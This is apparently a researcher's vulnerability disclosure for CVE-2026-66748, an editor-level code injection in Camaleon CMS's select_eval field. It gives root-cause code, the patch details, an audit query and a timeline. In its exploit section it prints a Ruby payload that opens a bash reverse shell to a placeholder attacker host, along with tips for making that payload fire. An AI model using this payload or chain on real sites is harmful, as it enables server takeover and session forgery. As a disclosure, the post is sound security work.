---
title: "CVE-2026-66748: Sir, Your Dropdown Is Running Bash: Finding RCE in Camaleon CMS"
date: 2026-07-29
draft: false
featured: false
notoc: true
summary: "A select field with Ruby eval support and no sanitization becomes a remote code execution vector in Camaleon CMS, exploitable by any editor-level account."
cve: "CVE-2026-66748"
tags: [ruby-on-rails, rce, cms, eval, camaleon-cms]
poc_url: "https://github.com/theopaid/CVE-2026-66748-Camaleon-CMS---Authenticated-RCE-via-select_eval-Custom-Field/blob/master/CVE-2026-66748.py"
poc_sha256: ""
poc_notes: "Authenticated RCE. Requires an account with custom_fields permission (editor-level or above). Tested against Camaleon CMS v2.9.1."
---

**Severity:** High (CVSS 4.0: 8.7) · **CWE:** CWE-94 (Code Injection) · **Status:** Patched in v2.9.2

`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L`

## Background

Camaleon CMS is a Ruby on Rails content management system. It ships a custom field engine that lets admins attach extra fields to posts, pages, and users: text fields, dropdowns, file uploads, and several specialized types. One of those is `select_eval`.

---

## The `select_eval` field type

`select_eval` builds a select dropdown whose options come from a Ruby expression the field author supplies. The definition lives in `custom_fields_helper.rb`:

```ruby
# app/helpers/camaleon_cms/admin/custom_fields_helper.rb, lines 302-318 (abridged)
items[:select_eval] = {
  key: 'select_eval',
  label: t('camaleon_cms.admin.custom_field.fields.select_eval'),
  options: { required: true, multiple: false, default_value: '', show_frontend: false },
  extra_fields: [{ type: 'text_area', key: 'command', label: 'Command to Eval' }]
}
```

The extra field is labeled "Command to Eval". Camaleon stores that expression in `field.options[:command]` and renders it in `_select_eval.html.erb`:

```erb
<%# app/views/camaleon_cms/admin/settings/custom_fields/fields/_select_eval.html.erb, line 2 %>
<%= select_tag "#{field_name}[#{field.slug}][values][]",
      instance_eval(field.options[:command].to_s.strip),
      class: "form-control input-value #{'required' if field.options[:required].to_s.to_bool}" %>
```

`instance_eval` runs on a value read from the database, inside a Rails ERB view. The binding has access to helpers, request context, and everything else the view layer can touch. The expression runs every time someone opens a post edit page that uses this field group.

<img src="/images/hmm-cat.gif" alt="" style="max-width: 260px; width: 100%;" class="centered-img">

---

## What makes this exploitable

Executing Ruby from the database only matters if an attacker can write to that field.

In `custom_fields_controller.rb`, `_save_fields` handles saving field options:

```ruby
# app/controllers/camaleon_cms/admin/settings/custom_fields_controller.rb, lines 100-102 (abridged)
def _save_fields(group)
  errors_saved, _all_fields = group.add_fields(
    params[:fields] ? params.require(:fields).permit! : {},
    params[:field_options] ? params.require(:field_options).permit! : {}
  )
  # ... error handling
end
```

`permit!` passes every parameter under `field_options` straight through to the model, including `command`. There is no whitelist and no filtering. A POST of `field_options[x][command]=<ruby>` writes the expression to the database.

`ability.rb` governs who reaches that endpoint. It grants `can :manage` to any key present in the role's `@roles_manager` hash, including `custom_fields`:

```ruby
# app/models/camaleon_cms/ability.rb, lines 161-165
@roles_manager.try(:each) do |rol_manage_key, val_role|
  can :manage, rol_manage_key.to_sym if val_role.to_s.cama_true?
rescue StandardError
  false
end
```

Further up the same file, eight resources get `manage` granted explicitly: `media`, `comments`, `themes`, `widgets`, `nav_menu`, `plugins`, `users`, and `settings`. `custom_fields` is not among them. It reaches `can :manage` only through this catch-all loop, which grants any key present in the role's hash without checking whether that key is safe to hand out.

On most Camaleon installations, editor-level accounts have `custom_fields` set. This is not an admin-only gate. An attacker with any editor account has everything they need.

---

## Exploit chain

![](/images/come-sit-here.gif)

The full chain is three steps:

1. Log in as any user with `custom_fields` permission
2. POST to `/admin/settings/custom_fields` to create a field group with a `select_eval` field where `command` is your payload
3. GET any post edit page that uses the field group, and `instance_eval` fires immediately

The payload wraps the shell in `Thread.new` so the page render does not hang waiting for it to return:

```ruby
[["ok","ok"]].tap{Thread.new{system("bash -i >& /dev/tcp/ATTACKER/PORT 0>&1")}}
```

`instance_eval` returns the array, which satisfies `select_tag`, while the thread opens a reverse shell in the background.

Two implementation details matter. First, the `assign_group` parameter when creating the field group must be `PostType_Post,<type_id>`, not just `PostType,<type_id>`. The difference matters because `get_field_groups` on the Post model queries for `object_class = 'PostType_Post'` specifically, so a field group created with the wrong class never gets rendered and the payload never fires. Second, the strings inside the payload need to use double quotes. Ruby single-quoted strings do not interpolate `#{}`, so any backtick commands wrapped in single quotes execute as literal text and do nothing.

![PoC script output showing field group creation and edit page trigger](/images/camaleon-rce-evidence-1.png)

---

## Impact

Any account with `custom_fields` permission on an affected version gets:

- Arbitrary Ruby execution in the Rails process, with the privileges of the web server user
- Execution that repeats, since the payload fires on every render of every post using the field group rather than once
- Forged session cookies for any user including admins, by reading `Rails.application.secret_key_base` and signing them
- Access to every site's data on a shared multi-site Camaleon instance

---

## A note on prior research

GitHub Security Lab published a batch of five advisories against Camaleon CMS in late 2024 (GHSL-2024-182 through GHSL-2024-186). One of them, GHSL-2024-185 (GHSA-7x4w-cj9r-h4v9), covers a field type called `label_eval` which has the same root cause: arbitrary Ruby executed via `instance_eval` in a view. Two of the five advisories received CVE numbers, CVE-2024-46986 and CVE-2024-46987. GHSL-2024-185 was not one of them.

`select_eval` and `label_eval` are siblings. Same mechanism, different field type:

|                | `label_eval` (GHSL-2024-185) | `select_eval` (this report) |
|---|---|---|
| Execution site | Field label in any form | `select_tag` in post edit page |
| Write path | Custom field label text | `field.options[:command]` meta row |

This report is specifically about `select_eval`.

---

## Affected versions

The vulnerability was introduced in commit `415cbda6` on 2015-10-16, when `select_eval` was first added. It affected every release from 2.1.1 through 2.9.1.

That range comes from source analysis rather than testing: the `instance_eval` call in `_select_eval.html.erb` and the unfiltered `permit!` write path in `_save_fields` are both present in every release across that span. Exploitation was confirmed end to end on v2.9.1.

The fix landed in v2.9.2 (commit `15882366`, 2026-03-29). `_save_fields` now calls `permitted_fields` and `permitted_field_options`, which replace `permit!` with an explicit allowlist. `command` is not on it.

Separately, `custom_field_group.rb` gained a dedicated `select_eval` permission. Creating or modifying a `select_eval` field now requires `can?(:manage, :select_eval)`, which admins hold implicitly and other roles hold only if it is granted to them.

`instance_eval` itself was not removed. The fix tightens who can write the expression rather than removing the eval.

If you are running any version older than v2.9.2, update now.

If you are already on v2.9.2, audit your database anyway. Any `select_eval` field that survived the upgrade still executes its stored expression on every render. Run this query and review what comes back:

```sql
-- MySQL (key is a reserved word, so it needs backticks)
SELECT * FROM metas WHERE `key` = '_default' AND value LIKE '%select_eval%';

-- PostgreSQL
SELECT * FROM metas WHERE "key" = '_default' AND value LIKE '%select_eval%';
```

---

## Timeline

| Date | Event |
|---|---|
| 2026-03-29 | Patch released (v2.9.2) |
| 2026-06-19 | Vulnerability discovered during source analysis of v2.9.2 and v2.9.1 |
| 2026-06-21 | Vendor notified, disclosure prepared |
| 2026-07-28 | CVE-2026-66748 assigned |
| 2026-07-29 | Public disclosure |

---

## Takeaway

`eval` in any form deserves a second look, especially when the input comes from the database rather than directly from a request. Database values feel safe because they passed through the application at some earlier point, but if the write path had no sanitization, the stored value is just as attacker-controlled as anything in a POST body.

The PoC and full technical disclosure are available at [github.com/theopaid/CVE-2026-66748-Camaleon-CMS---Authenticated-RCE-via-select_eval-Custom-Field](https://github.com/theopaid/CVE-2026-66748-Camaleon-CMS---Authenticated-RCE-via-select_eval-Custom-Field).
